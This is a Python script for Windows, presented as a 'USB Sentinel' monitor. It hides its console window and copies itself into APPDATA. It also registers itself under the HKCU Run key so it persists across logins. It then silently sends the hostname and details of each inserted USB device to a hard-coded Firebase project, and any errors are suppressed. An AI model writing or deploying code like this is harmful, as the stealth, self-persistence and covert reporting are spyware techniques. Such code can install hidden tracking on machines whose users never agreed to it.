import os
import sys
import shutil
import ctypes
import time
import wmi
import requests
import datetime
import socket
import winreg

APP_NAME = "USB Sentinel"
STARTUP_PATH = os.path.join(os.environ['APPDATA'], "usb_sentinel.exe")
FIREBASE_PROJECT_ID = "cybermonitor-1ab3c"
COLLECTION = "usb_logs"

# ---------------- Self-copy & add to startup ----------------
def add_to_startup():
    try:
        if not os.path.exists(STARTUP_PATH):
            shutil.copy(sys.executable, STARTUP_PATH)
        # Registry key
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, STARTUP_PATH)
        winreg.CloseKey(key)
    except Exception as e:
        pass

# ---------------- Hide console window ----------------
def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ---------------- USB Monitoring ----------------
def get_user():
    try:
        return socket.gethostname()
    except:
        return "unknown_user"

def send_to_firebase(data):
    url = f"https://firestore.googleapis.com/v1/projects/{FIREBASE_PROJECT_ID}/databases/(default)/documents/{COLLECTION}"
    payload = {
        "fields": {
            "user": {"stringValue": data["user"]},
            "device": {"stringValue": data["device"]},
            "serial": {"stringValue": data["serial"]},
            "action": {"stringValue": data["action"]},
            "time": {"stringValue": data["time"]}
        }
    }
    try:
        requests.post(url, json=payload)
    except:
        pass

def usb_monitor():
    c = wmi.WMI()
    watcher = c.Win32_USBHub.watch_for("creation")
    while True:
        try:
            usb = watcher()
            info = {
                "user": get_user(),
                "device": usb.Name or "Unknown USB",
                "serial": usb.DeviceID,
                "action": "Inserted",
                "time": str(datetime.datetime.now())
            }
            send_to_firebase(info)
            time.sleep(1)
        except:
            time.sleep(1)

# ---------------- Main ----------------
if __name__ == "__main__":
    hide_console()
    add_to_startup()
    usb_monitor()
